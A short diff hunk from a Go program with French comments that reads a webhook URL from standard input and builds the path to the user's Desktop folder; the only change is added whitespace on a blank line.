@@ -25,7 +25,7 @@ func main() {
     scanner := bufio.NewScanner(os.Stdin)
     scanner.Scan() // Lit l'entrée utilisateur
     webhookURL := scanner.Text()
-
+    
     // Construit le chemin vers le bureau de l'utilisateur courant en utilisant la variable d'environnement USERPROFILE
     desktopPath := filepath.Join(os.Getenv("USERPROFILE"), "Desktop")
 
